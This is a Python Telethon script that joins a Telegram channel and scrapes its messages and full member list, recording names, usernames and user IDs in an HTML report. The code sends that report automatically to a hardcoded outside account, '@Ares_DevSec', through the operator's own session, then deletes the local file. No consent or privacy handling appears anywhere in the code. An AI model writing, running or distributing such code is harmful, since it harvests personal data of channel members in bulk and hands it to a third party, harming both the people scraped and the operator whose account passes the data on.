from telethon import TelegramClient
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
import os
import colorama
import argparse
import time

# Настройки для Telethon
api_id = API_ID
api_hash = 'API_HASH'
phone = 'Phone'

client = TelegramClient(phone, api_id, api_hash)

lim = int(3900)

async def get_messages(client, channel, limit=lim):
    messages = []
    try:
        async for message in client.iter_messages(channel, limit):
            if message.text:
                user_id = message.from_id if message.from_id else 'Unknown'
                print(f'{colorama.Fore.WHITE}[{colorama.Fore.CYAN}{time.asctime()}{colorama.Fore.WHITE}]{colorama.Fore.WHITE}[{colorama.Fore.YELLOW}Message{colorama.Fore.WHITE}] {colorama.Fore.GREEN}{message.text} {colorama.Fore.WHITE}[{colorama.Fore.YELLOW}UserID{colorama.Fore.WHITE}] [{colorama.Fore.MAGENTA}{user_id}{colorama.Fore.WHITE}][{colorama.Fore.YELLOW}Date of Dispatch{colorama.Fore.WHITE}] {colorama.Fore.WHITE}[{colorama.Fore.MAGENTA}{message.date}{colorama.Fore.WHITE}]{colorama.Fore.RESET}')
                messages.append(f"<p style='color: green;'>Message: {message.text}<br>ID: {user_id}<br>Date: {message.date}</p><hr>\n")
        return messages
    except Exception as e:
        return []

async def join_channel(client, channel_link):
    try:
        await client(JoinChannelRequest(channel_link))
        print(f"{colorama.Fore.WHITE}[{colorama.Fore.CYAN}{time.asctime()}{colorama.Fore.WHITE}]{colorama.Fore.GREEN}Присоединился к каналу: {colorama.Fore.WHITE}{channel_link}{colorama.Fore.RESET}")
    except Exception as e:
        print(f"Не удалось присоединиться к каналу: {e}\nПроверь ссылку.")

async def enum_users(client, channel_link):
    try:
        users = await client.get_participants(channel_link)
        user_info = []
        for user in users:
            user_info.append(f"<p style='color: green;'>First_name: {user.first_name}, Last_name: {user.last_name}, Username: {user.username}, ID: {user.id}</p>")
        return user_info
    except Exception as e:
        return []

async def generate_report(messages, users):
    try:
        with open('report.html', 'a') as f:
            f.write("<html><head><style>body { background-color: black; color: darkgreen; font-family: Arial, sans-serif; } h1, h2 { text-align: center; }</style></head><body>\n")
            f.write("\n<h1 style='color: green;'>Отчёт о сообщениях и пользователях</h1>\n")
            f.write(f"\n<h2 style='color: green;'>Total Messages<span style='color: red;'>:</span><span style='color: yellow;'>{len(messages)}</span></h2>\n")
            f.write("\n\n".join(messages))
            f.write(f"\n<h2 style='color: green;'>Total Users<span style='color: red;'>:</span> <span style='color: yellow;'>{len(users)}</span></h2>\n")
            f.write("\n\n".join(users))
            f.write("\n</body></html>\n")
    except Exception as e:
        print(f"Ошибка при генерации отчета: {e}{colorama.Fore.RESET}")

async def send_report(client, channel_link, users, messages):
    admin = '@Ares_DevSec'
    try:
        await client.send_file(admin, 'report.html', caption=f'CH: {channel_link} | \nTotal_Users: {len(users)}\nTotal SMS: {len(messages)}\nDate: {time.asctime()}')
        print(f"{colorama.Fore.WHITE}[{colorama.Fore.CYAN}{time.asctime()}{colorama.Fore.WHITE}] {colorama.Fore.GREEN}Отчёт отправлен пользователю {colorama.Fore.YELLOW}{admin}{colorama.Fore.RESET}")
    except Exception as e:
        print(f"Ошибка при отправке отчета: {e}{colorama.Fore.RESET}")

async def func():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", help="ссылка на канал")
    argum = parser.parse_args()
    channel_link = argum.c
    if not channel_link:
        exit()
    await join_channel(client, channel_link)  
    messages = await get_messages(client, channel_link)  
    users = await enum_users(client, channel_link)     
    await generate_report(messages, users)  
    await send_report(client, channel_link, users, messages)
    print(f"{colorama.Fore.WHITE}[{colorama.Fore.CYAN}{time.asctime()}{colorama.Fore.WHITE}] {colorama.Fore.GREEN}Отчёт сгенерирован и отправлен.{colorama.Fore.RESET}\n{colorama.Fore.WHITE}[{colorama.Fore.CYAN}{time.asctime()}{colorama.Fore.WHITE}]{colorama.Fore.GREEN} Total Users{colorama.Fore.RED} -> {colorama.Fore.YELLOW}{len(users)}\n{colorama.Fore.WHITE}[{colorama.Fore.CYAN}{time.asctime()}{colorama.Fore.WHITE}]{colorama.Fore.GREEN} Total Messages{colorama.Fore.RED} -> {colorama.Fore.YELLOW}{len(messages)}")
    os.system('rm report.html')

async def main():
    try:
        await func()
    except FloodWaitError as a:
        print(f'Flood Wait Error: нужно подождать {a.seconds} секунд.{colorama.Fore.RESET}')
        time.sleep(a.seconds)
        await main()

with client:
    client.loop.run_until_complete(main())

